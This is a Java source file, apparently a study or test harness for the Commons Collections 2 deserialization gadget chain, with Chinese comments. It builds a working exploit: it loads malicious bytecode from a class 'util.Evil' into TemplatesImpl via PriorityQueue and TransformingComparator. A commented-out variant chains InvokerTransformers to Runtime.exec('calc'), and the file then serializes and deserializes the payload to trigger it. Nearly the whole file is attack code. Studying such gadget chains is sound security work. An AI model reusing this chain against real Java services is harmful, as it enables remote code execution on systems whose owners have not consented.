package vuln;


import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import util.SerializeUtil;

import java.io.IOException;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
/**
 * cc2的测试环境
 * jdk7
 * cc版本4.0
 *
 * **/
public class Commoncollections2 {
    public static void main(String[] args) throws IOException, NotFoundException, CannotCompileException, NoSuchFieldException, ClassNotFoundException, IllegalAccessException {
        vulnToTemplatesImpl();
//        vulnToCC2();
    }
    /**
     * 在这个函数中,漏洞触发点为add方法
     * 因为是需要通过反序列化来实现执行恶意代码
     * 所以需要提前将无用的数据赋值,后续通过反射的方式修复即可
     * **/
//    public static void vulnToCC2() throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
//        ChainedTransformer fake = new ChainedTransformer(new Transformer[]{
//                new ConstantTransformer(1)
//        });
//        ChainedTransformer chainedTransformer = new ChainedTransformer(
//                new Transformer[]{new ConstantTransformer(Runtime.class),
//                        new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
//                        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
//                        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})}
//        );
//        TransformingComparator comparator = new TransformingComparator(fake);
//        PriorityQueue priorityQueue = new PriorityQueue(1,comparator);
//        priorityQueue.add(1);
//        priorityQueue.add(1);
//        Field iTransformers = TransformingComparator.class.getDeclaredField("transformer");
//        iTransformers.setAccessible(true);
//        iTransformers.set(comparator,chainedTransformer);
//        SerializeUtil.writeObjectToFile(priorityQueue);
//        SerializeUtil.readObjectToFile();
//    }

    /**
     * 调用链
     * ObjectInputStream.readObject()
     * PriorityQueue.readObject()
     * PriorityQueue.heapify()
     * PriorityQueue.siftDown()
     * PriorityQueue.siftDownUsingComparator()
     * TransformingComparator.compare()
     * ChainedTransformer.transform()
     * ...
     * Runtime.exec()
     * **/
    public static void vulnToTemplatesImpl() throws IOException, CannotCompileException, NotFoundException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        PriorityQueue priorityQueue = new PriorityQueue();
        priorityQueue.add(1);
        priorityQueue.add(1);
        //获取恶意类的字节码
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get("util.Evil");
        byte[] evilPayload = ctClass.toBytecode();
        //设置恶意字节码到TemplatesImpl中
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_name","v1f18");
//        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        setFieldValue(templates,"_bytecodes",new byte[][]{evilPayload});
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer",null,null);
        TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer);
        setFieldValue(priorityQueue,"comparator",transformingComparator);

        Field queue = priorityQueue.getClass().getDeclaredField("queue");
        queue.setAccessible(true);
        Object[] o = (Object[]) queue.get(priorityQueue);
        o[0] = templates;
        SerializeUtil.writeObjectToFile(priorityQueue);
        SerializeUtil.readObjectToFile();
    }

    public static void setFieldValue(Object obj,String name,Object value) throws NoSuchFieldException, IllegalAccessException {
        Field iTransformers = obj.getClass().getDeclaredField(name);
        iTransformers.setAccessible(true);
        iTransformers.set(obj,value);
    }

}
